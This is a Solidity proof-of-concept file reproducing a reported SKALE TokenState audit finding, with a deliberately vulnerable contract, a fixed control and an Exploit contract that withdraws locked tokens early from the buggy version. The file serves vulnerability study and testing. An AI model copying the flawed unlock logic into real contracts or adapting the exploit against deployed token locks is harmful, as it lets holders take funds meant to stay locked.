// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  SKALE TokenState — ending a delegation unlocks tokens that should stay purchased
    (ConsenSys Diligence, SKALE token, Jan 2020). TokenState.sol L258-L264.
    SYNTHETIC, cheatcode-free reduction.
    Delegation end adds the amount straight to unlocked. The holder withdraws N
    while totalDelegated is still below purchased, so the lock is not over.
    The control puts the amount back into purchased and does not unlock it. */

contract Cash {
    string public symbol = "SKL";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BuggyState {
    Cash public cash;
    mapping(address => uint256) public purchased;
    mapping(address => uint256) public totalDelegated;
    mapping(address => uint256) public unlocked;

    constructor(address _cash) {
        cash = Cash(_cash);
    }

    function seed(address holder, uint256 purchasedAmount, uint256 delegated) external {
        purchased[holder] = purchasedAmount;
        totalDelegated[holder] = delegated;
        cash.mint(address(this), delegated);
    }

    function onDelegationEnd(address holder, uint256 amount) external {
        totalDelegated[holder] -= amount;
        // @> VULN: delegation end unlocks the tokens even though delegated is below purchased
        unlocked[holder] += amount;
    }

    function claim(address holder) external returns (uint256 amount) {
        amount = unlocked[holder];
        require(amount > 0, "locked");
        unlocked[holder] = 0;
        cash.transfer(holder, amount);
    }
}

contract FixedState {
    Cash public cash;
    mapping(address => uint256) public purchased;
    mapping(address => uint256) public totalDelegated;
    mapping(address => uint256) public unlocked;

    constructor(address _cash) {
        cash = Cash(_cash);
    }

    function seed(address holder, uint256 purchasedAmount, uint256 delegated) external {
        purchased[holder] = purchasedAmount;
        totalDelegated[holder] = delegated;
        cash.mint(address(this), delegated);
    }

    function onDelegationEnd(address holder, uint256 amount) external {
        totalDelegated[holder] -= amount;
        purchased[holder] += amount;
        if (totalDelegated[holder] >= purchased[holder]) {
            unlocked[holder] = purchased[holder];
        }
    }

    function claim(address holder) external returns (uint256 amount) {
        amount = unlocked[holder];
        require(amount > 0, "locked");
        unlocked[holder] = 0;
        cash.transfer(holder, amount);
    }
}

contract Holder {}

contract Exploit {
    uint256 public constant N = 1000 ether;
    uint256 public constant PURCHASED = 5000 ether;

    Cash public cash;
    BuggyState public buggy;
    FixedState public fixedState;
    Holder public holder;

    uint256 public withdrawn;
    bool public controlClaimed;
    uint256 public stillLocked;

    constructor() {
        cash = new Cash();
        buggy = new BuggyState(address(cash));
        fixedState = new FixedState(address(cash));
        holder = new Holder();
        buggy.seed(address(holder), PURCHASED, N);
        fixedState.seed(address(holder), PURCHASED, N);
    }

    function run() external {
        require(N < PURCHASED, "below half");
        buggy.onDelegationEnd(address(holder), N);
        withdrawn = buggy.claim(address(holder));
        require(withdrawn == N, "early");
        require(cash.balanceOf(address(holder)) == N, "paid");
        fixedState.onDelegationEnd(address(holder), N);
        try fixedState.claim(address(holder)) returns (uint256) {
            controlClaimed = true;
        } catch {
            controlClaimed = false;
        }
        require(!controlClaimed, "control paid");
        stillLocked = fixedState.purchased(address(holder));
        require(stillLocked == PURCHASED + N, "returned to purchased");
        require(fixedState.unlocked(address(holder)) == 0, "control unlocked");
    }
}
